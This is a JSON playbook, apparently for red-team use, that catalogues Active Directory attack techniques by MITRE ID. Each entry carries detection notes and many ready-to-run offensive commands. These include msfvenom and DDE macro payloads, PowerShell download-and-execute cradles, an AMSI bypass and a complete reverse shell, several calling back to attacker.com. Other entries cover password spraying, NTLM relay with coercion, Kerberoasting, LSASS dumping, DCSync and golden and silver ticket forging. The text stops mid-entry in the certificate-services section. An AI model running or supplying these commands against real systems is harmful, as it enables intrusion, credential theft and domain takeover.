{
  "infrastructure": "ad",
  "name": "Active Directory Attack Techniques",
  "version": "1.0.0",
  "techniques": [
    {
      "id": "AD-RECON-001",
      "mitre_id": "T1087.002",
      "name": "LDAP Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "ad",
      "description": "Query LDAP for users, groups, computers, and organizational units to map the domain structure",
      "prerequisites": ["Network access to domain controller", "Valid domain credentials or anonymous bind"],
      "tools": ["ldapsearch", "PowerView", "ADExplorer", "BloodHound"],
      "detection": "Monitor LDAP queries (Event 1644), unusual query patterns from non-admin workstations",
      "references": ["https://attack.mitre.org/techniques/T1087/002/"],
      "next_techniques": ["AD-RECON-002", "AD-CRED-001"],
      "risk_level": "low",
      "commands": [
        "# Enumerate all users with ldapsearch",
        "ldapsearch -x -H ldap://DC01.domain.local -D 'user@domain.local' -w 'Password123' -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName",
        "# Enumerate all computers in the domain",
        "ldapsearch -x -H ldap://DC01.domain.local -D 'user@domain.local' -w 'Password123' -b 'DC=domain,DC=local' '(objectClass=computer)' dNSHostName",
        "# Find all domain admins using ldapsearch",
        "ldapsearch -x -H ldap://DC01.domain.local -D 'user@domain.local' -w 'Password123' -b 'CN=Domain Admins,CN=Users,DC=domain,DC=local' member",
        "# PowerView - Get all domain users",
        "Get-DomainUser -Domain domain.local | Select-Object samaccountname,description,memberof",
        "# PowerView - Get all domain computers",
        "Get-DomainComputer -Domain domain.local | Select-Object dnshostname,operatingsystem",
        "# PowerView - Get all organizational units",
        "Get-DomainOU -Domain domain.local | Select-Object name,distinguishedname",
        "# PowerView - Find users with SPNs (potential Kerberoast targets)",
        "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname",
        "# ADFind - Enumerate all users",
        "adfind.exe -h DC01.domain.local -u domain\\user -up Password123 -f \"(objectClass=user)\" sAMAccountName",
        "# CrackMapExec - Enumerate domain users",
        "crackmapexec ldap DC01.domain.local -u user -p 'Password123' --users",
        "# CrackMapExec - Enumerate domain groups",
        "crackmapexec ldap DC01.domain.local -u user -p 'Password123' --groups"
      ]
    },
    {
      "id": "AD-RECON-002",
      "mitre_id": "T1482",
      "name": "Domain Trust Enumeration",
      "phase": "reconnaissance",
      "infrastructure": "ad",
      "description": "Enumerate domain trusts to identify attack paths to other domains and forests",
      "prerequisites": ["Valid domain credentials"],
      "tools": ["nltest", "PowerView Get-DomainTrust", "BloodHound"],
      "detection": "Event 4624 logon followed by trust enumeration queries",
      "references": ["https://attack.mitre.org/techniques/T1482/"],
      "next_techniques": ["AD-LATERAL-005"],
      "risk_level": "low",
      "commands": [
        "# nltest - Enumerate all domain trusts",
        "nltest /domain_trusts /all_trusts",
        "# nltest - Get detailed trust information",
        "nltest /trusted_domains",
        "# PowerView - Enumerate domain trusts",
        "Get-DomainTrust -Domain domain.local",
        "# PowerView - Enumerate forest trusts",
        "Get-ForestTrust",
        "# PowerView - Get all domains in the forest",
        "Get-ForestDomain",
        "# PowerView - Map all trust relationships",
        "Get-DomainTrustMapping",
        "# ADFind - Enumerate trusts",
        "adfind.exe -h DC01.domain.local -f \"(objectClass=trustedDomain)\" name trustDirection trustType",
        "# .NET - Enumerate trusts programmatically",
        "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()",
        "# .NET - Get forest trusts",
        "[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GetAllTrustRelationships()",
        "# CrackMapExec - Enumerate trusts",
        "crackmapexec ldap DC01.domain.local -u user -p 'Password123' --trusted-for-delegation"
      ]
    },
    {
      "id": "AD-RECON-003",
      "mitre_id": "T1018",
      "name": "BloodHound Collection",
      "phase": "reconnaissance",
      "infrastructure": "ad",
      "description": "Run BloodHound collectors to map AD relationships, ACLs, sessions, and identify attack paths to high-value targets",
      "prerequisites": ["Valid domain credentials", "SharpHound or equivalent collector"],
      "tools": ["SharpHound", "BloodHound.py", "AzureHound"],
      "detection": "Unusual LDAP queries, SAMR calls, remote registry access patterns",
      "references": ["https://bloodhound.readthedocs.io/"],
      "next_techniques": ["AD-PRIVESC-001", "AD-CRED-001", "AD-LATERAL-001"],
      "risk_level": "medium",
      "commands": [
        "# SharpHound - Collect all data (default collection)",
        "SharpHound.exe -c All",
        "# SharpHound - Collect with stealth options (no session collection)",
        "SharpHound.exe -c DCOnly --stealth",
        "# SharpHound - Collect only from specific domain",
        "SharpHound.exe -c All -d domain.local",
        "# SharpHound - Collect with LDAP SSL",
        "SharpHound.exe -c All --secureldap",
        "# SharpHound - Loop collection for session data",
        "SharpHound.exe -c Session --loop --loopduration 02:00:00",
        "# BloodHound.py - Python collector (from Linux)",
        "bloodhound-python -u user -p 'Password123' -d domain.local -dc DC01.domain.local -c All",
        "# BloodHound.py - Collect with specific collection methods",
        "bloodhound-python -u user -p 'Password123' -d domain.local -dc DC01.domain.local -c Group,LocalAdmin,Session,Trusts,ACL",
        "# BloodHound.py - Use NTLM hash instead of password",
        "bloodhound-python -u user --hashes :NTLMHASH -d domain.local -dc DC01.domain.local -c All",
        "# AzureHound - Collect Azure AD data",
        "AzureHound.exe -r domain.local",
        "# BOFHound - Collect via Beacon Object Files (Cobalt Strike)",
        "inline-execute BOFHound.o"
      ]
    },
    {
      "id": "AD-INIT-001",
      "mitre_id": "T1566.001",
      "name": "Spearphishing with Macro",
      "phase": "initial_access",
      "infrastructure": "ad",
      "description": "Send targeted phishing emails with malicious macro-enabled Office documents to gain initial foothold",
      "prerequisites": ["Target email addresses", "Macro-enabled document"],
      "tools": ["Macro payloads", "Cobalt Strike", "Custom loaders"],
      "detection": "Email gateway filtering, macro execution logging, AMSI",
      "references": ["https://attack.mitre.org/techniques/T1566/001/"],
      "next_techniques": ["AD-EXEC-001", "AD-CRED-002"],
      "risk_level": "medium",
      "commands": [
        "# Generate macro payload with msfvenom",
        "msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f vba -o macro.vba",
        "# Cobalt Strike - Generate Office macro",
        "Attacks -> Packages -> MS Office Macro",
        "# Unicorn - Generate PowerShell macro payload",
        "python unicorn.py windows/meterpreter/reverse_https attacker.com 443 macro",
        "# MacroPack - Obfuscate and generate macro",
        "echo 'payload.exe' | macro_pack.exe -t EMBED_EXE -o -G payload.doc",
        "# Generate HTA payload for embedding",
        "msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f hta-psh -o payload.hta",
        "# EvilClippy - Hide macros from Office GUI",
        "EvilClippy.exe -s payload.doc",
        "# Office DDE payload (no macro needed)",
        "{ DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\" }",
        "# VBA Stomping - Remove VBA source code but keep p-code",
        "python pcode2code.py payload.doc --stomp"
      ]
    },
    {
      "id": "AD-INIT-002",
      "mitre_id": "T1110.003",
      "name": "Password Spraying",
      "phase": "initial_access",
      "infrastructure": "ad",
      "description": "Attempt common passwords against many accounts to avoid lockouts while finding valid credentials",
      "prerequisites": ["List of valid usernames", "Knowledge of password policy"],
      "tools": ["Spray", "Ruler", "MailSniper", "Kerbrute"],
      "detection": "Event 4625 failures from single source, 4771 Kerberos pre-auth failures",
      "references": ["https://attack.mitre.org/techniques/T1110/003/"],
      "next_techniques": ["AD-CRED-001", "AD-LATERAL-001"],
      "risk_level": "medium",
      "commands": [
        "# Kerbrute - Spray password against user list (fast, uses Kerberos)",
        "kerbrute passwordspray -d domain.local --dc DC01.domain.local users.txt 'Summer2024!'",
        "# Kerbrute - Enumerate valid users first",
        "kerbrute userenum -d domain.local --dc DC01.domain.local usernames.txt",
        "# CrackMapExec - SMB password spray",
        "crackmapexec smb DC01.domain.local -u users.txt -p 'Summer2024!' --continue-on-success",
        "# CrackMapExec - Spray with multiple passwords",
        "crackmapexec smb DC01.domain.local -u users.txt -p passwords.txt --no-bruteforce --continue-on-success",
        "# Spray.py - Domain password spraying",
        "spray.py -smb DC01.domain.local -u users.txt -p 'Summer2024!'",
        "# Ruler - Exchange/OWA password spray",
        "ruler --domain domain.local --url https://mail.domain.local/autodiscover/autodiscover.xml brute --userpass userpass.txt",
        "# MailSniper - OWA password spray",
        "Invoke-PasswordSprayOWA -ExchHostname mail.domain.local -UserList users.txt -Password 'Summer2024!'",
        "# DomainPasswordSpray - PowerShell password spray",
        "Invoke-DomainPasswordSpray -UserList users.txt -Password 'Summer2024!' -Domain domain.local",
        "# SprayingToolkit - O365 password spray",
        "python3 atomizer.py o365 users.txt 'Summer2024!'",
        "# TREVORspray - Multi-protocol password spray",
        "trevorspray -u users.txt -p 'Summer2024!' --url https://login.microsoftonline.com"
      ]
    },
    {
      "id": "AD-INIT-003",
      "mitre_id": "T1557.001",
      "name": "LLMNR/NBT-NS Poisoning",
      "phase": "initial_access",
      "infrastructure": "ad",
      "description": "Respond to LLMNR/NBT-NS broadcast queries to capture NTLMv2 hashes for offline cracking or relay",
      "prerequisites": ["Network access on the same subnet as targets"],
      "tools": ["Responder", "Inveigh", "Pretender"],
      "detection": "Monitor for rogue LLMNR/NBT-NS responses, NetNTLMv2 authentication anomalies",
      "references": ["https://attack.mitre.org/techniques/T1557/001/"],
      "next_techniques": ["AD-CRED-002", "AD-INIT-004"],
      "risk_level": "medium",
      "commands": [
        "# Responder - Start LLMNR/NBT-NS/mDNS poisoner",
        "responder -I eth0 -dwP",
        "# Responder - Analyze mode (passive, no poisoning)",
        "responder -I eth0 -A",
        "# Responder - Force WPAD authentication",
        "responder -I eth0 -wF",
        "# Inveigh - PowerShell LLMNR/NBNS spoofer",
        "Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Proxy Y",
        "# Inveigh - Capture only, no poisoning",
        "Invoke-Inveigh -ConsoleOutput Y -Inspect Y",
        "# Pretender - Modern cross-platform responder alternative",
        "pretender -i eth0 --spoof-types llmnr,nbns,mdns",
        "# Responder - Capture WPAD traffic",
        "responder -I eth0 -wFP",
        "# Check captured hashes in Responder logs",
        "cat /usr/share/responder/logs/Responder-Session.log",
        "# Crack captured NetNTLMv2 hashes with hashcat",
        "hashcat -m 5600 captured_hashes.txt wordlist.txt",
        "# Crack captured NetNTLMv2 hashes with john",
        "john --format=netntlmv2 captured_hashes.txt --wordlist=wordlist.txt"
      ]
    },
    {
      "id": "AD-INIT-004",
      "mitre_id": "T1557.001",
      "name": "NTLM Relay Attack",
      "phase": "initial_access",
      "infrastructure": "ad",
      "description": "Relay captured NTLM authentication to other services (SMB, LDAP, HTTP) to gain unauthorized access",
      "prerequisites": ["Captured NTLM authentication", "Target service without SMB signing"],
      "tools": ["ntlmrelayx.py", "Responder", "MultiRelay"],
      "detection": "SMB signing enforcement, LDAP signing, EPA for web apps",
      "references": ["https://attack.mitre.org/techniques/T1557/001/"],
      "next_techniques": ["AD-EXEC-001", "AD-PRIVESC-002"],
      "risk_level": "high",
      "commands": [
        "# ntlmrelayx - Relay to SMB and execute command",
        "ntlmrelayx.py -t smb://192.168.1.100 -c 'whoami > C:\\pwned.txt'",
        "# ntlmrelayx - Relay to multiple targets from file",
        "ntlmrelayx.py -tf targets.txt -smb2support",
        "# ntlmrelayx - Relay to LDAP and add computer account",
        "ntlmrelayx.py -t ldaps://DC01.domain.local --add-computer EVILPC$ --delegate-access",
        "# ntlmrelayx - Relay to LDAP and dump domain info",
        "ntlmrelayx.py -t ldap://DC01.domain.local --dump-domain",
        "# ntlmrelayx - Relay to LDAP and escalate via ACL abuse",
        "ntlmrelayx.py -t ldaps://DC01.domain.local --escalate-user attackeruser",
        "# ntlmrelayx - SOCKS proxy mode for interactive relay",
        "ntlmrelayx.py -tf targets.txt -socks -smb2support",
        "# Responder with relay (disable SMB and HTTP servers)",
        "responder -I eth0 -dwP --disable-ess",
        "# PetitPotam - Coerce authentication from DC (pair with relay)",
        "python3 PetitPotam.py -d domain.local -u user -p 'Password123' attacker_ip DC01.domain.local",
        "# PrinterBug/SpoolSample - Coerce authentication via Print Spooler",
        "python3 printerbug.py domain.local/user:Password123@DC01.domain.local attacker_ip",
        "# DFSCoerce - Coerce authentication via DFS",
        "python3 dfscoerce.py -d domain.local -u user -p 'Password123' attacker_ip DC01.domain.local"
      ]
    },
    {
      "id": "AD-EXEC-001",
      "mitre_id": "T1059.001",
      "name": "PowerShell Execution",
      "phase": "execution",
      "infrastructure": "ad",
      "description": "Execute malicious PowerShell commands or scripts for reconnaissance, credential theft, or lateral movement",
      "prerequisites": ["Code execution on target system"],
      "tools": ["PowerShell", "PowerShell Empire", "Cobalt Strike"],
      "detection": "Script block logging (4104), module logging, AMSI, Constrained Language Mode",
      "references": ["https://attack.mitre.org/techniques/T1059/001/"],
      "next_techniques": ["AD-CRED-002", "AD-LATERAL-001"],
      "risk_level": "medium",
      "commands": [
        "# Download and execute script in memory (fileless)",
        "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"",
        "# Encoded PowerShell command execution",
        "powershell -ep bypass -enc <base64_encoded_command>",
        "# AMSI bypass before executing payload",
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "# PowerShell Empire - Start listener and generate stager",
        "uselistener http; set Host http://attacker.com; execute",
        "# Cobalt Strike - Execute PowerShell payload",
        "powershell-import /path/to/script.ps1; powershell Get-DomainUser",
        "# PowerShell Constrained Language Mode bypass",
        "powershell -version 2 -ep bypass -c \"<command>\"",
        "# Load PowerView in memory",
        "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')",
        "# Invoke-Mimikatz in memory",
        "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
        "# PowerShell reverse shell",
        "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
      ]
    },
    {
      "id": "AD-CRED-001",
      "mitre_id": "T1558.003",
      "name": "Kerberoasting",
      "phase": "credential_access",
      "infrastructure": "ad",
      "description": "Request TGS tickets for service accounts with SPNs, then crack them offline to obtain service account passwords",
      "prerequisites": ["Valid domain user credentials"],
      "tools": ["Rubeus kerberoast", "Impacket GetUserSPNs.py", "PowerView Invoke-Kerberoast"],
      "detection": "Event 4769 with RC4 encryption (0x17), anomalous TGS requests",
      "references": ["https://attack.mitre.org/techniques/T1558/003/"],
      "next_techniques": ["AD-PRIVESC-001", "AD-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# Impacket GetUserSPNs - Extract service account TGS tickets",
        "GetUserSPNs.py domain.local/user:Password123 -dc-ip 192.168.1.1 -request",
        "# Impacket GetUserSPNs - Output tickets to file for cracking",
        "GetUserSPNs.py domain.local/user:Password123 -dc-ip 192.168.1.1 -request -outputfile kerberoast_hashes.txt",
        "# Impacket GetUserSPNs - Use NTLM hash instead of password",
        "GetUserSPNs.py domain.local/user -hashes :NTLMHASH -dc-ip 192.168.1.1 -request",
        "# Rubeus - Kerberoast all service accounts",
        "Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt",
        "# Rubeus - Kerberoast specific user",
        "Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt",
        "# Rubeus - Kerberoast with RC4 downgrade attack",
        "Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast_hashes.txt",
        "# Rubeus - Kerberoast using AES encryption (stealthier)",
        "Rubeus.exe kerberoast /aes /outfile:kerberoast_hashes.txt",
        "# PowerView - Invoke Kerberoast attack",
        "Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -FilePath hashes.txt",
        "# Crack Kerberos tickets with hashcat (TGS-REP etype 23 - RC4)",
        "hashcat -m 13100 kerberoast_hashes.txt wordlist.txt -r rules/best64.rule",
        "# Crack Kerberos tickets with john",
        "john --format=krb5tgs kerberoast_hashes.txt --wordlist=wordlist.txt",
        "# CrackMapExec - Kerberoast",
        "crackmapexec ldap DC01.domain.local -u user -p 'Password123' --kerberoasting kerberoast_hashes.txt"
      ]
    },
    {
      "id": "AD-CRED-002",
      "mitre_id": "T1003.001",
      "name": "LSASS Memory Dump",
      "phase": "credential_access",
      "infrastructure": "ad",
      "description": "Dump LSASS process memory to extract plaintext passwords, NTLM hashes, and Kerberos tickets",
      "prerequisites": ["Local administrator on target", "SeDebugPrivilege"],
      "tools": ["Mimikatz sekurlsa::logonpasswords", "procdump", "comsvcs.dll MiniDump"],
      "detection": "LSASS access monitoring, Credential Guard, Event 4656/4663 on LSASS",
      "references": ["https://attack.mitre.org/techniques/T1003/001/"],
      "next_techniques": ["AD-LATERAL-001", "AD-LATERAL-002"],
      "risk_level": "critical",
      "commands": [
        "# Mimikatz - Dump credentials from LSASS",
        "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
        "# Mimikatz - Dump Kerberos tickets",
        "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit",
        "# Mimikatz - Dump cached credentials",
        "mimikatz.exe \"privilege::debug\" \"lsadump::cache\" exit",
        "# Procdump - Create LSASS dump file (Sysinternals)",
        "procdump.exe -ma lsass.exe lsass.dmp",
        "# Procdump - Dump LSASS with obfuscated process name",
        "procdump.exe -ma -r lsass.exe lsass.dmp",
        "# comsvcs.dll - Dump LSASS using built-in Windows DLL",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\lsass.dmp full",
        "# Task Manager - Manual LSASS dump (GUI method)",
        "# Right-click lsass.exe -> Create dump file",
        "# Pypykatz - Parse LSASS dump on Linux",
        "pypykatz lsa minidump lsass.dmp",
        "# Mimikatz - Parse offline LSASS dump",
        "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit",
        "# Nanodump - Stealthy LSASS dump using syscalls",
        "nanodump.exe --write lsass.dmp",
        "# HandleKatz - Dump LSASS via handle duplication",
        "handlekatz.exe --pid <lsass_pid> --outfile lsass.dmp",
        "# CrackMapExec - Remote LSASS dump",
        "crackmapexec smb 192.168.1.100 -u admin -p 'Password123' -M lsassy"
      ]
    },
    {
      "id": "AD-CRED-003",
      "mitre_id": "T1558.004",
      "name": "AS-REP Roasting",
      "phase": "credential_access",
      "infrastructure": "ad",
      "description": "Request AS-REP for accounts without Kerberos pre-authentication, then crack offline",
      "prerequisites": ["Knowledge of usernames (no credentials needed)"],
      "tools": ["Rubeus asreproast", "Impacket GetNPUsers.py", "Kerbrute"],
      "detection": "Event 4768 without prior 4771, accounts with DONT_REQ_PREAUTH flag",
      "references": ["https://attack.mitre.org/techniques/T1558/004/"],
      "next_techniques": ["AD-LATERAL-001", "AD-CRED-001"],
      "risk_level": "high",
      "commands": [
        "# Impacket GetNPUsers - Find AS-REP roastable accounts (no creds needed)",
        "GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.1 -format hashcat",
        "# Impacket GetNPUsers - With valid credentials to enumerate users",
        "GetNPUsers.py domain.local/user:Password123 -dc-ip 192.168.1.1 -request",
        "# Impacket GetNPUsers - Output to file",
        "GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.1 -format hashcat -outputfile asrep_hashes.txt",
        "# Rubeus - AS-REP roast all vulnerable accounts",
        "Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt",
        "# Rubeus - AS-REP roast specific user",
        "Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:asrep_hashes.txt",
        "# Kerbrute - Find AS-REP roastable users",
        "kerbrute userenum -d domain.local --dc DC01.domain.local users.txt",
        "# PowerView - Find accounts with DONT_REQ_PREAUTH",
        "Get-DomainUser -PreauthNotRequired | Select-Object samaccountname",
        "# Crack AS-REP hashes with hashcat (etype 23)",
        "hashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/best64.rule",
        "# Crack AS-REP hashes with john",
        "john --format=krb5asrep asrep_hashes.txt --wordlist=wordlist.txt",
        "# CrackMapExec - AS-REP roasting",
        "crackmapexec ldap DC01.domain.local -u user -p 'Password123' --asreproast asrep_hashes.txt"
      ]
    },
    {
      "id": "AD-CRED-004",
      "mitre_id": "T1003.006",
      "name": "DCSync",
      "phase": "credential_access",
      "infrastructure": "ad",
      "description": "Simulate domain controller replication to extract password hashes for all domain accounts including KRBTGT",
      "prerequisites": ["Replicating Directory Changes rights (Domain Admin, DC, or specific ACL)"],
      "tools": ["Mimikatz lsadump::dcsync", "Impacket secretsdump.py"],
      "detection": "Event 4662 with DS-Replication-Get-Changes, replication from non-DC",
      "references": ["https://attack.mitre.org/techniques/T1003/006/"],
      "next_techniques": ["AD-PERSIST-001", "AD-PERSIST-002"],
      "risk_level": "critical",
      "commands": [
        "# Mimikatz - DCSync to get KRBTGT hash",
        "mimikatz.exe \"lsadump::dcsync /domain:domain.local /user:krbtgt\" exit",
        "# Mimikatz - DCSync to get all user hashes",
        "mimikatz.exe \"lsadump::dcsync /domain:domain.local /all /csv\" exit",
        "# Mimikatz - DCSync specific user",
        "mimikatz.exe \"lsadump::dcsync /domain:domain.local /user:Administrator\" exit",
        "# Impacket secretsdump - DCSync via replication",
        "secretsdump.py domain.local/admin:'Password123'@DC01.domain.local -just-dc",
        "# Impacket secretsdump - DCSync with NTLM hash",
        "secretsdump.py domain.local/admin@DC01.domain.local -hashes :NTLMHASH -just-dc",
        "# Impacket secretsdump - Get only NTLM hashes",
        "secretsdump.py domain.local/admin:'Password123'@DC01.domain.local -just-dc-ntlm",
        "# Impacket secretsdump - Get only specific user",
        "secretsdump.py domain.local/admin:'Password123'@DC01.domain.local -just-dc-user krbtgt",
        "# CrackMapExec - DCSync",
        "crackmapexec smb DC01.domain.local -u admin -p 'Password123' --ntds",
        "# CrackMapExec - DCSync with hash",
        "crackmapexec smb DC01.domain.local -u admin -H NTLMHASH --ntds drsuapi",
        "# Extract hashes from NTDS.dit (offline)",
        "secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL"
      ]
    },
    {
      "id": "AD-CRED-005",
      "mitre_id": "T1552.006",
      "name": "Group Policy Preferences Passwords",
      "phase": "credential_access",
      "infrastructure": "ad",
      "description": "Extract passwords stored in Group Policy Preferences XML files (legacy vulnerability)",
      "prerequisites": ["Read access to SYSVOL"],
      "tools": ["Get-GPPPassword", "gpp-decrypt", "CrackMapExec"],
      "detection": "Audit SYSVOL access, remove GPP passwords from environment",
      "references": ["https://attack.mitre.org/techniques/T1552/006/"],
      "next_techniques": ["AD-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# PowerSploit - Get GPP passwords from SYSVOL",
        "Get-GPPPassword",
        "# Manually search SYSVOL for Groups.xml files",
        "findstr /S /I cpassword \\\\domain.local\\SYSVOL\\domain.local\\policies\\*.xml",
        "# CrackMapExec - Get GPP passwords",
        "crackmapexec smb DC01.domain.local -u user -p 'Password123' -M gpp_password",
        "# Impacket - Get GPP passwords",
        "Get-GPPPassword.py domain.local/user:Password123@DC01.domain.local",
        "# gpp-decrypt - Decrypt cpassword value manually",
        "gpp-decrypt +bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE",
        "# Metasploit - GPP credential scanner",
        "use auxiliary/scanner/smb/smb_enum_gpp; set RHOSTS DC01.domain.local; run",
        "# PowerView - Search for GPP passwords",
        "Get-DomainGPO | Get-GPOReport -ReportType Xml | Select-String cpassword",
        "# Manual decryption with Python",
        "python3 -c \"from Crypto.Cipher import AES; import base64; key=b'\\x4e\\x99\\x06\\xe8\\xfc\\xb6\\x6c\\xc9\\xfa\\xf4\\x93\\x10\\x62\\x0f\\xfe\\xe8\\xf4\\x96\\xe8\\x06\\xcc\\x05\\x79\\x90\\x20\\x9b\\x09\\xa4\\x33\\xb6\\x6c\\x1b'; iv=b'\\x00'*16; print(AES.new(key,AES.MODE_CBC,iv).decrypt(base64.b64decode('ENCRYPTED_CPASSWORD')).decode())\"",
        "# Locate all policy files that might contain passwords",
        "dir /s \\\\domain.local\\SYSVOL\\domain.local\\policies\\*.xml"
      ]
    },
    {
      "id": "AD-CRED-006",
      "mitre_id": "T1558.001",
      "name": "Golden Ticket",
      "phase": "credential_access",
      "infrastructure": "ad",
      "description": "Forge TGT using the KRBTGT hash for persistent, unlimited domain access",
      "prerequisites": ["KRBTGT hash (from DCSync or NTDS.dit extraction)"],
      "tools": ["Mimikatz kerberos::golden", "Impacket ticketer.py", "Rubeus"],
      "detection": "Monitor for TGT without corresponding AS-REQ, anomalous ticket lifetimes",
      "references": ["https://attack.mitre.org/techniques/T1558/001/"],
      "next_techniques": ["AD-LATERAL-001", "AD-IMPACT-001"],
      "risk_level": "critical",
      "commands": [
        "# Mimikatz - Create Golden Ticket",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:KRBTGT_NTLM_HASH /ptt\" exit",
        "# Mimikatz - Golden Ticket with AES256 key (stealthier)",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /aes256:AES256_KEY /ptt\" exit",
        "# Mimikatz - Golden Ticket to file",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:KRBTGT_HASH /ticket:golden.kirbi\" exit",
        "# Impacket ticketer - Create Golden Ticket",
        "ticketer.py -domain domain.local -domain-sid S-1-5-21-XXXXXXXXXX -nthash KRBTGT_HASH Administrator",
        "# Impacket ticketer - With AES key",
        "ticketer.py -domain domain.local -domain-sid S-1-5-21-XXXXXXXXXX -aesKey AES256_KEY Administrator",
        "# Rubeus - Create Golden Ticket",
        "Rubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /rc4:KRBTGT_HASH /ptt",
        "# Rubeus - Golden Ticket with AES256",
        "Rubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /aes256:AES256_KEY /ptt",
        "# Set ticket for use with Impacket tools",
        "export KRB5CCNAME=/path/to/Administrator.ccache",
        "# Use Golden Ticket with psexec",
        "psexec.py -k -no-pass domain.local/Administrator@DC01.domain.local",
        "# Get domain SID for Golden Ticket creation",
        "Get-DomainSID"
      ]
    },
    {
      "id": "AD-CRED-007",
      "mitre_id": "T1558.002",
      "name": "Silver Ticket",
      "phase": "credential_access",
      "infrastructure": "ad",
      "description": "Forge TGS for specific services using service account hash, bypassing the KDC",
      "prerequisites": ["Service account NTLM hash or AES key"],
      "tools": ["Mimikatz kerberos::golden /service", "Impacket ticketer.py", "Rubeus"],
      "detection": "TGS without corresponding TGT request, PAC validation failures",
      "references": ["https://attack.mitre.org/techniques/T1558/002/"],
      "next_techniques": ["AD-LATERAL-003"],
      "risk_level": "high",
      "commands": [
        "# Mimikatz - Create Silver Ticket for CIFS service",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /target:server.domain.local /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt\" exit",
        "# Mimikatz - Silver Ticket for HTTP/web service",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /target:web.domain.local /service:http /rc4:SERVICE_HASH /ptt\" exit",
        "# Mimikatz - Silver Ticket for LDAP (DCSync)",
        "mimikatz.exe \"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /target:DC01.domain.local /service:ldap /rc4:DC_HASH /ptt\" exit",
        "# Impacket ticketer - Create Silver Ticket",
        "ticketer.py -domain domain.local -domain-sid S-1-5-21-XXXXXXXXXX -nthash SERVICE_HASH -spn cifs/server.domain.local Administrator",
        "# Rubeus - Create Silver Ticket",
        "Rubeus.exe silver /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt",
        "# Rubeus - Silver Ticket with AES256",
        "Rubeus.exe silver /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX /target:server.domain.local /service:cifs /aes256:AES_KEY /ptt",
        "# Common service SPNs for Silver Tickets",
        "# cifs - File share access",
        "# http - Web applications, WinRM",
        "# host - PsExec, scheduled tasks",
        "# ldap - DCSync (if targeting DC)",
        "# mssql - SQL Server access"
      ]
    },
    {
      "id": "AD-CRED-008",
      "mitre_id": "T1649",
      "name": "AD Certificate Services Abuse",
      "phase": "credential_access",
      "infrastructure": "ad",
      "description": "Exploit misconfigured AD CS templates (ESC1-ESC8) to obtain certificates for authentication or privilege escalation",
      "prerequisites": ["Domain user credentials", "Misconfigured certificate template"],
      "tools": ["Certify", "Certipy", "ForgeCert"],
      "detection": "Certificate enrollment auditing (Event 4886/4887), template ACL monitoring",
      "references": ["https://posts.specterops.io/certified-pre-owned-d95910965cd2"],
      "next_techniques": ["AD-PRIVESC-001", "AD-LATERAL-001"],
      "risk_level": "critical",
      "commands": [
        "# Certipy - Find vulnerable certificate templates",
        "certipy find -u user@domain.local -p 'Password123' -dc-ip 192.168.1.1 -vulnerable",
